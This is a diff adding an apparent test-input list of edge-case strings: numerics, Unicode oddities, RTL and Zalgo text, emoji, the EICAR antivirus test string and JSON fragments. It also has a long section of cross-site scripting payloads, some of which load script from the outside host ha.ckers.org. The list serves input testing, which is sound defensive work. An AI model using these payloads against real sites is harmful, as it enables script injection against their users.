@@ -1,0 +1,999 @@
+#	Reserved Strings
+#
+#	Strings which may be used elsewhere in code
+
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+true
+false
+True
+False
+TRUE
+FALSE
+None
+hasOwnProperty
+\
+\\
+
+# The EICAR String
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+#	Numeric Strings
+#
+#	Strings which can be interpreted as numeric
+
+0
+1
+1.00
+$1.00
+1/2
+1/0
+1E2
+1E02
+1E+02
+-1
+-1.00
+-$1.00
+-1/2
+-1E2
+-1E02
+-1E+02
+1/0
+0/0
+-2147483648/-1
+-9223372036854775808/-1
+-0
+-0.0
++0
++0.0
+0.00
+0..0
+.
+0.0.0
+0,00
+0,,0
+,
+0,0,0
+0.0/0
+1.0/0.0
+0.0/0.0
+1,0/0,0
+0,0/0,0
+--1
+-
+-.
+-,
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+NaN
+Infinity
+-Infinity
+INF
+1#INF
+-1#IND
+1#QNAN
+1#SNAN
+1#IND
+0x0
+0xffffffff
+0xffffffffffffffff
+0xabad1dea
+123456789012345678901234567890123456789
+1,000.00
+1 000.00
+1'000.00
+1,000,000.00
+1 000 000.00
+1'000'000.00
+1.000,00
+1 000,00
+1'000,00
+1.000.000,00
+1 000 000,00
+1'000'000,00
+01000
+08
+09
+2.2250738585072011e-308
+
+#	Special Characters
+#
+# ASCII punctuation.  All of these characters may need to be escaped in some
+# contexts.  Divided into three groups based on (US-layout) keyboard position.
+
+,./;'[]\-=
+<>?:"{}|_+
+!@#$%^&*()`~
+
+# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,
+# and U+007F (DEL)
+# Often forbidden to appear in various text-based file formats (e.g. XML),
+# or reused for internal delimiters on the theory that they should never
+# appear in input.
+# The next line may appear to be blank or mojibake in some viewers.
+
+
+# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F.
+# Commonly misinterpreted as additional graphic characters.
+# The next line may appear to be blank, mojibake, or dingbats in some viewers.
+
+
+# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode
+# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),
+# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often
+# treated as whitespace in some contexts.
+# This file unfortunately cannot express strings containing
+# U+0000, U+000A, or U+000D (NUL, LF, CR).
+# The next line may appear to be blank or mojibake in some viewers.
+# The next line may be flagged for "trailing whitespace" in some viewers.
+	              ​    　
+
+# Unicode additional control characters: all of the characters with
+# general category Cf (in Unicode 8.0.0).
+# The next line may appear to be blank or mojibake in some viewers.
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿
+
+# "Byte order marks", U+FEFF and U+FFFE, each on its own line.
+# The next two lines may appear to be blank or mojibake in some viewers.
+﻿
+￾
+
+#	Unicode Symbols
+#
+#	Strings which contain common unicode symbols (e.g. smart quotes)
+
+Ω≈ç√∫˜µ≤≥÷
+åß∂ƒ©˙∆˚¬…æ
+œ∑´®†¥¨ˆøπ“‘
+¡™£¢∞§¶•ªº–≠
+¸˛Ç◊ı˜Â¯˘¿
+ÅÍÎÏ˝ÓÔÒÚÆ☃
+Œ„´‰ˇÁ¨ˆØ∏”’
+`⁄€‹›ﬁﬂ‡°·‚—±
+⅛⅜⅝⅞
+ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя
+٠١٢٣٤٥٦٧٨٩
+
+#	Unicode Subscript/Superscript/Accents
+#
+#	Strings which contain unicode subscripts/superscripts; can cause rendering issues
+
+⁰⁴⁵
+₀₁₂
+⁰⁴⁵₀₁₂
+ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็
+
+#	Quotation Marks
+#
+#	Strings which contain misplaced quotation marks; can cause encoding errors
+
+'
+"
+''
+""
+'"'
+"''''"'"
+"'"'"''''"
+<foo val=“bar” />
+<foo val=“bar” />
+<foo val=”bar“ />
+<foo val=`bar' />
+
+#	Two-Byte Characters
+#
+#	Strings which contain two-byte characters: can cause rendering issues or character-length issues
+
+田中さんにあげて下さい
+パーティーへ行かないか
+和製漢語
+部落格
+사회과학원 어학연구소
+찦차를 타고 온 펲시맨과 쑛다리 똠방각하
+社會科學院語學研究所
+울란바토르
+𠜎𠜱𠝹𠱓𠱸𠲖𠳏
+
+#	Changing length when lowercased
+#
+#	Characters which increase in length (2 to 3 bytes) when lowercased
+#	Credit: https://twitter.com/jifa/status/625776454479970304
+
+Ⱥ
+Ⱦ
+
+#	Japanese Emoticons
+#
+#	Strings which consists of Japanese-style emoticons which are popular on the web
+
+ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ
+(｡◕ ∀ ◕｡)
+｀ｨ(´∀｀∩
+__ﾛ(,_,*)
+・(￣∀￣)・:*:
+ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ
+,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’
+(╯°□°）╯︵ ┻━┻)
+(ﾉಥ益ಥ）ﾉ﻿ ┻━┻
+┬─┬ノ( º _ ºノ)
+( ͡° ͜ʖ ͡°)
+¯\_(ツ)_/¯
+
+#	Emoji
+#
+#	Strings which contain Emoji; should be the same behavior as two-byte characters, but not always
+
+😍
+👩🏽
+👾 🙇 💁 🙅 🙆 🙋 🙎 🙍
+🐵 🙈 🙉 🙊
+❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
+✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿
+🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
+
+#       Regional Indicator Symbols
+#
+#       Regional Indicator Symbols can be displayed differently across
+#       fonts, and have a number of special behaviors
+
+🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸
+🇺🇸🇷🇺🇸🇦🇫🇦🇲
+🇺🇸🇷🇺🇸🇦
+
+#	Unicode Numbers
+#
+#	Strings which contain unicode numbers; if the code is localized, it should see the input as numeric
+
+１２３
+١٢٣
+
+#	Right-To-Left Strings
+#
+#	Strings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew)
+
+ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.
+בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
+הָיְתָהtestالصفحات التّحول
+﷽
+ﷺ
+مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،
+
+#	Trick Unicode
+#
+#	Strings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf)
+
+‪‪test‪
+‫test‫
+ test 
+test⁠test‫
+⁦test⁧
+
+#	Zalgo Text
+#
+#	Strings which contain "corrupted" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net)
+
+Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣
+̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰
+̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟
+̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕
+Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
+
+#	Unicode Upsidedown
+#
+#	Strings which contain unicode with an "upsidedown" effect (via http://www.upsidedowntext.com)
+
+˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥
+00˙Ɩ$-
+
+#	Unicode font
+#
+#	Strings which contain bold/italic/etc. versions of normal characters
+
+Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ
+𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠
+𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌
+𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈
+𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰
+𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘
+𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐
+⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢
+
+#	Script Injection
+#
+#	Strings which attempt to invoke a benign script injection; shows vulnerability to XSS
+
+<script>alert(123)</script>
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
+<img src=x onerror=alert(123) />
+<svg><script>123<1>alert(123)</script>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+><script>alert(123)</script>
+</script><script>alert(123)</script>
+< / script >< script >alert(123)< / script >
+ onfocus=JaVaSCript:alert(123) autofocus
+" onfocus=JaVaSCript:alert(123) autofocus
+' onfocus=JaVaSCript:alert(123) autofocus
+＜script＞alert(123)＜/script＞
+<sc<script>ript>alert(123)</sc</script>ript>
+--><script>alert(123)</script>
+";alert(123);t="
+';alert(123);t='
+JavaSCript:alert(123)
+;alert(123);
+src=JaVaSCript:prompt(132)
+"><script>alert(123);</script x="
+'><script>alert(123);</script x='
+><script>alert(123);</script x=
+" autofocus onkeyup="javascript:alert(123)
+' autofocus onkeyup='javascript:alert(123)
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF
+ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x09expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
+ABC<div style="x:\x00expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<img \x12src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x10src=x onerror="javascript:alert(1)">
+<img\x13src=x onerror="javascript:alert(1)">
+<img\x32src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x11src=x onerror="javascript:alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x34src=x onerror="javascript:alert(1)">
+<img \x39src=x onerror="javascript:alert(1)">
+<img \x00src=x onerror="javascript:alert(1)">
+<img src\x09=x onerror="javascript:alert(1)">
+<img src\x10=x onerror="javascript:alert(1)">
+<img src\x13=x onerror="javascript:alert(1)">
+<img src\x32=x onerror="javascript:alert(1)">
+<img src\x12=x onerror="javascript:alert(1)">
+<img src\x11=x onerror="javascript:alert(1)">
+<img src\x00=x onerror="javascript:alert(1)">
+<img src\x47=x onerror="javascript:alert(1)">
+<img src=x\x09onerror="javascript:alert(1)">
+<img src=x\x10onerror="javascript:alert(1)">
+<img src=x\x11onerror="javascript:alert(1)">
+<img src=x\x12onerror="javascript:alert(1)">
+<img src=x\x13onerror="javascript:alert(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<img src=x onerror=\x09"javascript:alert(1)">
+<img src=x onerror=\x10"javascript:alert(1)">
+<img src=x onerror=\x11"javascript:alert(1)">
+<img src=x onerror=\x12"javascript:alert(1)">
+<img src=x onerror=\x32"javascript:alert(1)">
+<img src=x onerror=\x00"javascript:alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<!--[if]><script>javascript:alert(1)</script -->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://ha.ckers.org/scriptlet.html <
+\";alert('XSS');//
+<u oncopy=alert()> Copy me</u>
+<i onwheel=alert(1)> Scroll over me </i>
+<plaintext>
+http://a/%%30%30
+</textarea><script>alert(123)</script>
+
+#
+#   JSON
+#
+{}
+{"1":"0"}
+{"1":0}
+{"0":"\x00"}
+{"0":[]}
+{"0":[1]}
+{"0":[1,2]}
+{"0":["1","2"]}
+{"\x00":"0"}
+{"\x00":0}
+{"\x00":""}
+{"\x00":[]}
